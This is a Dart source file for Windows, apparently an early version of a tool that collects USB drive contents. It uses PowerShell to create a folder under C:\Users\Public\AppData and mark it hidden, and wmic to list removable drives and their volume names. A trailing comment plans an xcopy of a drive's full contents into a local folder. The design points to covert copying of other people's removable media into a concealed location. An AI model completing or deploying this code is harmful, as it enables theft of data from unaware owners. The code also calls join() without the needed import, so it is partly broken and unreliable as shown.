import "dart:io";
import "dart:convert";

void main() {
  Process.run("powershell", [
    "-command",
    "if (Test-Path C:\\Users\\Public\\AppData\\sp.txt) {Remove-Item C:\\Users\\Public\\AppData\\sp.txt}"
  ]);

  Process.run("powershell", [
    "-command",
    "New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\AppData"
  ]); // Create folder where files will be copied.

  Process.run("powershell", [
    "-command",
    "\$f=get-item C:\\Users\\Public\\AppData -Force;\$f.attributes='Hidden'"
  ]); // Set the folder as hidden.

  // FileUtils.chdir("C:\\Users\\Public\\AppData");
  String tp = join("C:", "Users", "Public", "AppData", "sp.txt");
  print(tp);
  new File(tp).writeAsString(jsonEncode([])); // Write empty list to "sp.txt".

  Process.run('wmic', [
    'logicaldisk',
    'where',
    'drivetype=2',
    'get',
    'DeviceID'
  ]) // Check all drives of type "2" (= removable disk) connected to the device.

      .then((result) {
    String output = result.stdout;
    output = output.replaceAll("DeviceID", "").replaceAll(
        " ", ""); // Remove all useless infos in the output of the command.

    LineSplitter ls = new LineSplitter();
    List<String> driveLetters =
        ls.convert(output); // Divide the output into a List.

    driveLetters.removeWhere(
        (content) => content == ""); // Remove empty elements of the list.

    for (String deviceID in driveLetters) {
      // Iterate through all disponible removable disks.
      print(deviceID);
      Process.run('wmic', [
        'logicaldisk',
        'where',
        'DeviceID="$deviceID"',
        'get',
        'VolumeName'
      ]) // Check the volume name of the drives.

          .then((result) {
        String output = result.stdout;
        output = output.replaceAll("VolumeName", "").replaceAll(
            " ", ""); // Remove all useless infos in the output of the command.

        LineSplitter ls = new LineSplitter();
        List<String> volNames =
            ls.convert(output); // Divide the output into a List.

        volNames.removeWhere(
            (content) => content == ""); // Remove empty elements of the list.

        for (String volName in volNames) {
          // Iterate through the names of the volume (there shouldn't be more than one, but who knows, it's Windows after all ¯\_(ツ)_/¯).
          print(volName);
        }
      });
    }
  });
}

// Pour plus tard, commande de copie : "xcopy /E /I G:\ C:\Users\Firmin\Desktop\G_drive"
